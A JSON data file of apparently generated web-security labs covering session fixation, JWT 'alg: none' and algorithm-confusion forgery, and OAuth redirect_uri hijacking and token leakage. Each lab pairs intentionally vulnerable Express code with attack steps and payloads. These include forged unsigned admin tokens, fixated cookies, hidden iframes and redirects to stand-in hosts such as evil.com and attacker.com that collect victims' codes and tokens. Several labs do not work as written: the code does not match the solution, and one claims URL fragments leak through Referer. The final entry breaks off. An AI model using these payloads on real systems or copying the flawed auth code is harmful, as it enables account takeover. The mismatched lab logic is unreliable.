[
    {
        "Lab scenario": "Session fixation vulnerability in login endpoint",
        "Lab Description": "The login mechanism assigns a session identifier before verifying credentials. This allows an attacker to fixate a session for a victim. The application reuses the session token issued prior to authentication. To solve: hijack a session by forcing a victim to authenticate using a session token you control, then access their My account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp Suite and intercept your own visit to the site before logging in. Note the Set-Cookie header assigning a session ID.",
          "Send a GET /login request with the session ID still active but without credentials to Burp Repeater.",
          "Manually craft a phishing link including your session ID and send it to the victim (simulate this by manually modifying the session cookie during login).",
          "Log in as the victim while reusing your previously fixed session ID.",
          "After successful login, access /my-account and confirm you’re authenticated as the victim."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'sessionsecret', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'carlospw' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) { res.send('Welcome to your account, ' + req.session.username); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
        "payloads": [
          "Manually reuse pre-auth session cookie in post-auth request",
          "Fixate session ID via phishing URL with pre-issued cookie",
          "Set-Cookie: sessionID=attackersession; Path=/"
        ]
      },
      {
        "Lab scenario": "JWT tampering vulnerability in API authorization header",
        "Lab Description": "The backend accepts JWTs signed with the 'none' algorithm. This exposes the application to JWT tampering where the payload can be altered without a valid signature. To solve: tamper with the token to elevate privileges and access the /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite or Postman to inspect a request with a valid JWT from a logged-in user.",
          "Decode the JWT and observe the header and payload fields. Notice that algorithm is set to 'HS256'.",
          "Craft a new JWT with { \"alg\": \"none\" } in the header and set the payload role to 'admin'.",
          "Remove the signature part entirely and resend the token in the Authorization header.",
          "Send a request to /admin with the tampered JWT and verify access is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', role: 'user' }, { username: 'carlos', role: 'admin' }]; app.get('/token', (req, res) => { const token = jwt.sign({ username: 'user', role: 'user' }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(400).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\", \"role\":\"admin\"}",
          "JWT: base64url(header).base64url(payload). (no signature)"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage in redirect URI through Referer header",
        "Lab Description": "The OAuth implementation uses the implicit grant type and sends tokens in the URL fragment. When redirected to an insecure third-party page, the Referer header leaks the token. To solve: extract an access token leaked via the Referer header and use it to access a protected /profile endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start a proxy in Burp Suite and initiate the OAuth login flow.",
          "Observe the URL after redirection. Notice the access_token is included in the URL fragment.",
          "Redirect the user to a malicious domain (e.g., http://evil.com) that logs the Referer header.",
          "Capture the Referer header on your malicious domain to extract the token.",
          "Use Postman to send a request to /profile with the stolen token in the Authorization header."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'token123': 'carlos' }; app.get('/auth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token123'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token123') { res.send('Sensitive data for carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Token Leakage Lab running on http://localhost:' + PORT));",
        "payloads": [
          "OAuth callback URI redirecting to http://evil.com",
          "Stolen token: Bearer token123",
          "Authorization: Bearer token123"
        ]
      },
      {
        "Lab scenario": "Session fixation in login handler logic",
        "Lab Description": "This application fails to regenerate session identifiers during login. If an attacker can trick a user into logging in with a known session ID, they can later hijack that session. The application allows unauthenticated session identifiers to persist after login. To solve: Hijack Carlos's session by fixing the session ID before login and accessing his My account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a GET /login request and observe the Set-Cookie: session=... header.",
          "2. Note the session value and use Burp Repeater to craft a POST /login request for the victim (Carlos), keeping the same session cookie.",
          "3. Forward the POST request with Carlos's credentials using the fixed session ID.",
          "4. In a separate browser or session, send a GET /my-account request using the same session ID in the cookie.",
          "5. Verify successful hijack by accessing Carlos's My account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnkey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account of ${req.session.user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "Cookie: session=attackerKnownSessionID",
          "POST /login with Cookie: session=attackerKnownSessionID",
          "GET /my-account with Cookie: session=attackerKnownSessionID"
        ]
      },
      {
        "Lab scenario": "JWT tampering via 'alg: none' flaw",
        "Lab Description": "This lab uses JSON Web Tokens to authenticate users but improperly trusts the 'alg' field in the token header. If the server accepts tokens signed with 'alg': 'none', an attacker can forge arbitrary tokens. To solve: Forge a JWT for the admin user and access the admin panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite or Postman to intercept an authenticated request and extract the JWT.",
          "2. Decode the JWT using jwt.io or jwt_tool to view the header and payload.",
          "3. Create a new JWT with the header: {\"alg\":\"none\"}, and payload: {\"user\":\"admin\"}. Do not sign the token.",
          "4. Replace the original JWT with the forged token in the Authorization header.",
          "5. Send a GET /admin request with the forged token and verify access to the admin interface."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'rootpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: username }, 'secretkey'); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.user === 'admin') res.send('Admin panel accessed'); else res.status(403).send('Access denied'); } catch (e) { res.status(400).send('JWT error'); } }); app.listen(4001, () => console.log('JWT None Exploit Lab running'));",
        "payloads": [
          "{\"alg\":\"none\"}.eyJ1c2VyIjoiYWRtaW4ifQ.",
          "Authorization: Bearer <JWT with alg none>",
          "GET /admin with forged JWT"
        ]
      },
      {
        "Lab scenario": "OAuth redirection misuse in authorization flow",
        "Lab Description": "The OAuth integration in this application incorrectly trusts the 'redirect_uri' parameter without proper validation. An attacker can manipulate this to obtain authorization codes meant for other clients. To solve: Capture a valid OAuth code issued to Carlos and use it to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the OAuth authorization request and observe the redirect_uri parameter.",
          "2. Modify the redirect_uri to point to an attacker-controlled domain (http://evil.net/callback).",
          "3. Trick Carlos into clicking the manipulated OAuth URL, capturing the code from your callback server logs.",
          "4. Exchange the intercepted code for an access token via the /token endpoint.",
          "5. Use the token to access /user-info endpoint and retrieve Carlos’s profile or access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthServer = { client_id: 'client123', redirect_uri: '', users: [{ username: 'carlos' }] }; app.get('/auth', (req, res) => { const { redirect_uri, state } = req.query; oauthServer.redirect_uri = redirect_uri; const code = 'authcode-carlos'; const redirectUrl = `${redirect_uri}?code=${code}&state=${state}`; res.redirect(redirectUrl); }); app.get('/token', (req, res) => { const { code } = req.query; if (code === 'authcode-carlos') res.json({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.json({ user: 'carlos', role: 'user' }); else res.status(403).send('Access denied'); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",
        "payloads": [
          "GET /auth?redirect_uri=http://evil.net/callback&state=xyz",
          "Captured code: authcode-carlos",
          "GET /token?code=authcode-carlos",
          "Authorization: Bearer token-carlos",
          "GET /user-info with access token"
        ]
      },
      {
        "Lab scenario": "JWT 'none' algorithm bypass in Authorization Header",
        "Lab Description": "This lab uses stateless JWTs to manage user sessions and relies on the `alg` claim for cryptographic validation. The application fails to enforce signature verification when the 'alg' value is set to 'none'. The application trusts the header contents without validating a signature. To solve: Forge a valid admin token and access the /admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a valid JWT from a normal login session via the Authorization: Bearer header.",
          "Send the token to Burp Decoder and decode its base64 segments to reveal the header and payload.",
          "Modify the header to: {\"alg\":\"none\"}, and the payload to: {\"username\":\"admin\",\"role\":\"admin\"}. Leave the signature empty.",
          "Re-encode the JWT segments without signing and replace the original token in the Authorization header.",
          "Send a GET request to /admin with the forged token. Confirm admin access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else if (username === 'user' && password === 'userpass') { const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = payload.payload; if (user.role === 'admin') return res.send('Welcome admin'); } try { const user = jwt.verify(token, secret); if (user.role === 'admin') return res.send('Welcome admin'); } catch (e) { return res.status(403).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "{\"alg\":\"none\"} . {\"username\":\"admin\",\"role\":\"admin\"} ."
        ]
      },
      {
        "Lab scenario": "Open redirect in OAuth login flow enables account takeover",
        "Lab Description": "The app allows login using an OAuth provider and accepts any `redirect_uri` value passed during the initial auth request. This weak validation allows redirection of access tokens to attacker-controlled domains. To solve: Steal an OAuth token and access the victim's account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Open OAuth login flow in browser and observe the redirect_uri parameter.",
          "Use Burp Suite or OWASP ZAP to modify the `redirect_uri` value to point to your server (e.g., https://attacker.com/callback).",
          "Send the manipulated URL to the victim (e.g., through an embedded image or phishing email).",
          "On your server, capture the token via query string (e.g., /callback?token=XYZ).",
          "Use Postman to send a GET /account request with Authorization: Bearer <captured-token> to access the victim's account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/oauth/start', (req, res) => { const client_id = 'abc123'; const redirect_uri = req.query.redirect_uri; const url = `https://provider.com/auth?response_type=token&client_id=${client_id}&redirect_uri=${redirect_uri}`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const token = req.query.token; try { const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Welcome ${userInfo.data.name}`); } catch (e) { res.status(500).send('OAuth error'); } }); const PORT = 3001; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://target.com/oauth/start?redirect_uri=https://attacker.com/callback",
          "GET /account with Authorization: Bearer <captured_token>",
          "https://attacker.com/callback?token=<token>"
        ]
      },
      {
        "Lab scenario": "Session fixation via unrotated session ID after login",
        "Lab Description": "This application assigns a session ID prior to authentication but does not issue a new session ID upon successful login. This allows an attacker to set a session ID for a victim and then log in with it, hijacking the session. To solve: Fixate a session and hijack Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to initiate a session as a guest and note the Set-Cookie: session=abc123 header.",
          "Send a phishing link with this session ID embedded in a hidden iframe or JS redirect.",
          "Once the victim logs in using this session, their session will remain bound to abc123.",
          "Use Burp Repeater to access /my-account while sending Cookie: session=abc123.",
          "Confirm access to the victim’s account page without authentication."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'password1', alice: '123456' }; app.get('/', (req, res) => { const sid = req.cookies.session || Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = sessions[sid] || { loggedIn: false, username: null }; res.send('Welcome, guest'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.send(`Logged in as ${username}`); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.status(401).send('Not logged in'); } }); const PORT = 3002; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Cookie: session=abc123",
          "<iframe src='https://target.com' style='display:none'></iframe>",
          "POST /login with Cookie: session=abc123 and body: username=carlos&password=password1",
          "GET /my-account with Cookie: session=abc123"
        ]
      },
      {
        "Lab scenario": "JWT None Algorithm Authentication Bypass in Authorization Header",
        "Lab Description": "The application uses JWT tokens for user authentication but fails to validate the token's signing algorithm properly. It trusts tokens where the 'alg' field is set to 'none', allowing attackers to forge tokens without a valid signature. The application grants access to user-specific endpoints solely based on the decoded token. To solve: Forge a valid admin-level token and access the /admin page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a request after logging in as a normal user.",
          "Send the request with the JWT to Burp Decoder and decode its payload and header.",
          "Modify the 'alg' field to 'none' and change the 'username' field in payload to 'admin'.",
          "Remove the signature part from the JWT and re-encode the token.",
          "Send a request to /admin with the forged token in the Authorization header and confirm access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'my_secret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'supersecret') { const token = jwt.sign({ username: 'admin' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else if (username === 'user' && password === 'userpass') { const token = jwt.sign({ username: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'admin') { return res.send('Welcome, admin!'); } } else { try { const verified = jwt.verify(token, secret); if (verified.username === 'admin') return res.send('Welcome, admin!'); } catch (e) { return res.status(403).send('Invalid token'); } } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "Session Fixation via URL Parameter in Cookie Assignment",
        "Lab Description": "The application improperly assigns session identifiers based on a user-controlled query parameter. When a session ID is passed in the URL, the server uses it without validation, allowing attackers to pre-define the victim's session ID. To solve: Fix a session ID for Carlos before login, then log in with his credentials and hijack the session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Using OWASP ZAP, craft a GET request to /login?sessionid=attacker123 and observe the Set-Cookie response.",
          "Copy the fixed session ID into your browser's cookie jar using developer tools or an extension like EditThisCookie.",
          "Provide Carlos's credentials to the login form without changing the session ID.",
          "After Carlos logs in, visit /my-account using the hijacked session.",
          "Verify the session hijack by confirming Carlos’s account details are visible."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const users = { 'carlos': 'password1' }; app.get('/login', (req, res) => { const sessionId = req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send(`<form method='POST' action='/authenticate?sessionid=${sessionId}'>Username:<input name='username' />Password:<input name='password' /><button>Login</button></form>`); }); const sessions = {}; app.post('/authenticate', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const sessionId = req.query.sessionid; if (users[username] === password) { sessions[sessionId] = username; res.send('Login successful'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) return res.send(`Welcome to ${user}'s account page.`); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "/login?sessionid=attacker123",
          "Set-Cookie: sessionid=attacker123",
          "POST /authenticate?sessionid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth Authorization Code Interception in OAuth Redirect Endpoint",
        "Lab Description": "The OAuth implementation is vulnerable due to an open redirect flaw in the redirect_uri parameter. Attackers can hijack the authorization code by forcing a victim to authenticate and redirect the code to a malicious domain. To solve: Intercept Carlos’s OAuth code and exchange it for an access token to access /user-info.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Start Burp and intercept the OAuth flow after initiating login with a third-party provider.",
          "Locate the redirect_uri parameter and change it to your attacker-controlled server (e.g., http://evil.com/code-stealer).",
          "Host a listener on evil.com to capture the authorization code from redirected traffic.",
          "Extract the code from the intercepted request and manually send a POST request to the token endpoint using Postman.",
          "Use the obtained access token to access /user-info as Carlos and confirm success."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const users = { 'carlos': 'carlos@email.com' }; app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const code = 'carlos_auth_code'; res.redirect(`${redirect}?code=${code}`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; if (code === 'carlos_auth_code') { return res.json({ access_token: 'valid_token_for_carlos' }); } res.status(400).send('Invalid code'); }); app.get('/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'valid_token_for_carlos') { return res.send('Welcome, Carlos'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Interception Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "GET /auth?redirect_uri=http://evil.com/code-stealer",
          "POST /token with body code=carlos_auth_code",
          "Authorization: Bearer valid_token_for_carlos"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in authorization middleware",
        "Lab Description": "The application's authorization middleware incorrectly trusts the JWT 'alg' header value, allowing attackers to manipulate the signing algorithm. The application uses asymmetric RSA public key verification by default, but if the JWT's header is altered to use 'HS256', the server uses the public key as the HMAC secret. To solve: Forge a JWT for admin user and access their profile endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a request after logging in as a regular user and extract the JWT from the Authorization header.",
          "2. Decode the JWT using jwt.io or a local script to inspect its header and payload; note the use of RS256 algorithm.",
          "3. Modify the JWT header to replace 'RS256' with 'HS256', and change the payload to { \"user\": \"admin\" }.",
          "4. Sign the token using HMAC-SHA256 with the server's public RSA key as the secret, using a tool like jwt_tool or a Python script.",
          "5. Replace the original token in the Authorization header with the forged one and resend the request to /admin/profile to confirm successful access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.user === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"user\": \"admin\" } signed with HMAC using public key as secret",
          "Use jwt_tool.py --exploit alg_none or alg_hs256 with provided public.pem"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration in redirect URI",
        "Lab Description": "The application improperly validates redirect URIs during OAuth implicit flow, allowing an attacker to craft a malicious URL that steals the access token. The application accepts wildcard subdomains without proper origin validation. To solve: Capture a valid token via redirect hijack and access protected user info.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use OWASP ZAP or manual interception to initiate an OAuth login request; observe that the redirect_uri accepts wildcard subdomains of attacker.com.",
          "2. Create a malicious domain like evil.attacker.com and start a listener (e.g., with Python HTTP server) to capture query fragments.",
          "3. Craft an OAuth URL such as: https://auth.app.com/oauth/authorize?response_type=token&client_id=app-client&redirect_uri=https://evil.attacker.com&scope=read_profile",
          "4. Send this URL to the victim and wait for them to authenticate; their access_token will be redirected to your malicious endpoint.",
          "5. Use the stolen token in an Authorization: Bearer header to request /api/user/profile and access the protected resource."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const validRedirects = [/\\.attacker\\.com$/]; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, response_type } = req.query; if (response_type !== 'token') return res.status(400).send('Unsupported flow'); const isValid = validRedirects.some(rx => rx.test(redirect_uri)); if (isValid) { const token = 'eyFakeOAuthToken123'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.status(400).send('Invalid redirect URI'); } }); app.listen(4000);",
        "payloads": [
          "https://auth.app.com/oauth/authorize?response_type=token&client_id=app-client&redirect_uri=https://evil.attacker.com&scope=read_profile",
          "Redirect hijack using any *.attacker.com URI"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable token in login endpoint",
        "Lab Description": "This application assigns a session token before authentication and does not regenerate it upon login. The token is predictable and can be reused by an attacker. To solve: Fixate Carlos's session by injecting a known session ID before they log in, then use that session to access their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman or Burp to initiate a GET /login request and capture the Set-Cookie session ID from the response (e.g., sessionid=12345).",
          "2. Send the login link containing the sessionid to Carlos or simulate their login via CSRF-style form POST using that same session ID.",
          "3. Wait for Carlos to successfully log in, thus associating the known session ID with his account.",
          "4. Reuse the same sessionid=12345 in your browser or tool to access /account and retrieve Carlos’s information.",
          "5. Confirm access by loading /account and verifying that it returns Carlos’s personal details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { const sid = 'sess_' + Math.floor(Math.random() * 100000); sessions[sid] = null; res.cookie('sessionid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; if (users[username] === password) { sessions[sid] = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
        "payloads": [
          "Crafted sessionid sent to target: sess_12345",
          "Fixated cookie: sessionid=sess_12345 used post-login"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in token verification endpoint",
        "Lab Description": "This lab features a JSON Web Token (JWT)-based authentication mechanism where the server incorrectly trusts the 'alg' field in the token. The application verifies tokens using HMAC and exposes a `/jwt-check` API for verification. To solve: forge a valid token to access Carlos's protected account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to send a valid login request and capture the JWT token issued to your account.",
          "2. Decode the token using jwt.io and analyze its header. Observe the algorithm is 'RS256'.",
          "3. Modify the alg field to 'HS256' and use the public key as the HMAC secret to re-sign the token.",
          "4. Change the payload sub field to 'carlos' to impersonate the victim.",
          "5. Use the forged token in the Authorization header to access /my-account and confirm access is granted."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/jwt-check', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey, { algorithms: ['RS256', 'HS256'] }); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); res.send('Access denied'); } catch (err) { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running at http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiY2FybG9zIn0.[HMAC-SIGNATURE-WITH-PUBLIC-KEY]",
          "JWT header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
          "JWT payload: { \"sub\": \"carlos\" }"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token leakage via referer header",
        "Lab Description": "This lab implements OAuth 2.0 with an implicit grant flow. Upon successful login, the access token is included in the URL fragment. A third-party analytics script captures this fragment due to an insecure redirect URI. To solve: extract the access token issued to Carlos by monitoring outbound requests.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Open the browser DevTools and log in as yourself to observe the OAuth flow.",
          "2. Capture the redirect URI in the Location header, and note the access_token in the URL fragment.",
          "3. Observe that a third-party script sends a request to analytics.acme.net with the Referer header containing the token.",
          "4. Intercept the request using OWASP ZAP’s HTTP proxy to extract Carlos’s token.",
          "5. Use the stolen token in the Authorization header to access /my-account as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { const html = `<!DOCTYPE html><script src='https://analytics.acme.net/script.js'></script><p>OAuth login complete</p>`; res.send(html); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') return res.send('Carlos account details'); res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Flow Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://example.com/oauth-callback#access_token=carlos-oauth-token&token_type=bearer",
          "Authorization: Bearer carlos-oauth-token"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "This lab uses a custom session management system where session IDs are issued before login and stored in cookies. The application does not regenerate the session ID upon authentication. To solve: fix your own session ID, trick Carlos into logging in with it, then reuse the same session to access his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to visit the site and capture a pre-login session ID from the Set-Cookie header.",
          "2. Craft a phishing link containing the fixed session ID in a cookie header or embed it into an iframe exploit page.",
          "3. Send the crafted link to Carlos and wait for him to authenticate using your session.",
          "4. Once Carlos logs in, reuse the same session ID from your browser to access /my-account.",
          "5. Confirm access to Carlos's account data and verify the session was not regenerated post-auth."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); if (!req.cookies.sid) res.cookie('sid', sid); res.send('Welcome'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sid] = username; res.send('Login successful'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') res.send('Carlos private data'); else res.status(403).send('Unauthorized'); }); app.listen(5000, () => console.log('Session Fixation Lab running on port 5000'));",
        "payloads": [
          "Cookie: sid=known-session-id",
          "POST /login with sid cookie set before login",
          "Phishing link embedding fixed SID: <iframe src='http://target-site.com?sid=known-session-id'></iframe>"
        ]
      },
      {
        "Lab scenario": "Session Fixation in login flow with static token parameter",
